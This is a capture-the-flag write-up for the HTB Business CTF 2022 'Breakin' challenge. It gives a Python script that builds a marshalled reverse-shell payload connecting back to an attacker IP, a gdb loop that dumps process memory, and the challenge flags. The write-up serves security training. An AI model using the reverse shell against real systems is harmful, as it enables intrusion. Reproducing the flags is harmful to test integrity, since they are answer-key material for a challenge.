# HTB Business CTF 2022 - Breakin

## Challenge

Description with links to downloadable files.

Server: `nc 178.128.162.91 30687`

- [bkd](files/bkd)

### Metadata

- Difficulty: `medium`
- Tags: `reverse`, `linux`, `python`, `pwn`, `memory dump`
- Points: `400`
- Number of solvers: `tbd`

## Solution

### Accessing the web server

Reverse the binary, the `/secret` endpoint is accessible if you present the flag of the `breakout` challenge.

```
http://157.245.33.78:32344/secret?password=HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....} 
```

### Analysing the binary

There is a file upload form and you can execute the uploaded files. If you reverse the binary you can see the the programs are loaded and executed by the python C library.

```
PyMarshal_ReadObjectFromString()
PyImport_ExecCodeModule('Payload')
PyObject_CallMethod('main')
```

References:
- <https://stackoverflow.com/questions/72492221/embedded-python-py-compilestring-pyimport-execcodemodule-why-arent-my-objec>
- <https://awasu.com/weblog/embedding-python/calling-python-code-from-your-program/>

### Gaining code execution on the server

Create a reverse shell using `compile` and `marshal`:

```python
import marshal

IP = '<IP>'
payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+IP+'",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

s = '''
def main():
    '''+payload+'''
    return "YES"
'''
print(s)

print(marshal.dumps(compile(s, 'payload', 'exec')).hex())
```

Upload the reverse shell

### Dumping the memory of the process

- Find the `bkd` process id using `ps aux`, install `gdb` and `zip` (`apk add gdb && apk add zip`)
- Dump the `bkd` process memory

```shell
$ grep rw-p /proc/8/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
    gdb --batch --pid 8 -ex \
        "dump memory bkd-$start-$stop.dump 0x$start 0x$stop"; \
done
```

- ZIP the memory files and download it from the website
- <http://134.209.183.143:32140/memory.zip>

### Getting the flag

Search for our current shared encryption key or some hex data

```hexdump
0044fab0  e3 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0044fac0  00 02 00 00 00 40 00 00  00 73 2c 00 00 00 64 00  |.....@...s,...d.|
0044fad0  64 01 6c 00 5a 00 64 00  64 01 6c 01 5a 01 64 00  |d.l.Z.d.d.l.Z.d.|
0044fae0  64 01 6c 02 5a 02 64 00  64 01 6c 03 5a 03 64 02  |d.l.Z.d.d.l.Z.d.|
0044faf0  64 03 84 00 5a 04 64 01  53 00 29 04 e9 00 00 00  |d...Z.d.S.).....|
0044fb00  00 4e 63 00 00 00 00 00  00 00 00 00 00 00 00 01  |.Nc.............|
0044fb10  00 00 00 08 00 00 00 43  00 00 00 73 46 00 00 00  |.......C...sF...|
0044fb20  74 00 a0 01 a1 00 7d 00  7c 00 a0 02 74 03 a0 04  |t.....}.|...t...|
0044fb30  64 01 a1 01 a1 01 01 00  7c 00 a0 02 74 05 a0 06  |d.......|...t...|
0044fb40  64 02 74 07 74 08 a0 08  a1 00 83 01 64 03 3f 00  |d.t.t.......d.?.|
0044fb50  a1 02 a1 01 01 00 64 04  7c 00 a0 09 a1 00 9b 00  |......d.|.......|
0044fb60  64 05 9d 03 53 00 29 06  4e 5a 44 34 38 35 34 34  |d...S.).NZD48544|
0044fb70  32 37 62 36 34 33 31 36  34 35 66 37 39 33 30 37  |27b6431645f79307|
0044fb80  35 35 66 37 37 33 34 36  63 36 62 35 66 37 34 36  |55f77346c6b5f746|
0044fb90  38 33 33 35 66 37 34 37  32 33 33 33 33 35 66 36  |8335f747233335f6|
0044fba0  36 33 30 37 32 35 66 36  64 33 33 33 66 37 64 da  |630725f6d333f7d.|
0044fbb0  01 48 e9 11 00 00 00 7a  25 4f 75 72 20 63 75 72  |.H.....z%Our cur|
0044fbc0  72 65 6e 74 20 73 68 61  72 65 64 20 65 6e 63 72  |rent shared encr|
0044fbd0  79 70 74 69 6f 6e 20 6b  65 79 20 69 73 20 7a 38  |yption key is z8|
0044fbe0  2e 20 52 65 6d 65 6d 62  65 72 20 74 6f 20 63 68  |. Remember to ch|
0044fbf0  65 63 6b 20 74 68 69 73  20 6c 6f 63 61 74 69 6f  |eck this locatio|
0044fc00  6e 20 72 65 67 75 6c 61  72 6c 79 20 66 6f 72 20  |n regularly for |
0044fc10  75 70 64 61 74 65 73 2e  29 0a da 07 68 61 73 68  |updates.)...hash|
0044fc20  6c 69 62 da 06 73 68 61  32 35 36 da 06 75 70 64  |lib..sha256..upd|
0044fc30  61 74 65 da 08 62 69 6e  61 73 63 69 69 da 09 75  |ate..binascii..u|
0044fc40  6e 68 65 78 6c 69 66 79  da 06 73 74 72 75 63 74  |nhexlify..struct|
0044fc50  da 04 70 61 63 6b da 03  69 6e 74 da 04 74 69 6d  |..pack..int..tim|
0044fc60  65 da 09 68 65 78 64 69  67 65 73 74 29 01 5a 06  |e..hexdigest).Z.|
0044fc70  68 61 73 68 65 72 a9 00  72 0e 00 00 00 fa 06 6b  |hasher..r......k|
0044fc80  65 79 2e 70 79 da 04 6d  61 69 6e 07 00 00 00 73  |ey.py..main....s|
0044fc90  08 00 00 00 08 01 10 01  1e 01 10 01 72 10 00 00  |............r...|
0044fca0  00 29 05 72 04 00 00 00  72 0c 00 00 00 72 09 00  |.).r....r....r..|
0044fcb0  00 00 72 07 00 00 00 72  10 00 00 00 72 0e 00 00  |..r....r....r...|
0044fcc0  00 72 0e 00 00 00 72 0e  00 00 00 72 0f 00 00 00  |.r....r....r....|
0044fcd0  da 08 3c 6d 6f 64 75 6c  65 3e 01 00 00 00 73 0a  |..<module>....s.|
0044fce0  00 00 00 08 00 08 01 08  01 08 01 0c 03 00 30 31  |..............01|
0044fcf0  61 31 30 30 37 64 30 30  37 63 30 30 61 30 30 32  |a1007d007c00a002|
0044fd00  37 34 30 33 61 30 30 34  36 34 30 31 61 31 30 31  |7403a0046401a101|
0044fd10  61 31 30 31 30 31 30 30  37 63 30 30 61 30 30 32  |a10101007c00a002|
0044fd20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

The flag is in hex: `4854427b6431645f7930755f77346c6b5f7468335f747233335f6630725f6d333f7d`

Flag: `HTB{d1d_y0u_w4lk_th3_tr33_f0r_m3?}`

## Files

* [bkd](files/bkd): Challenge binary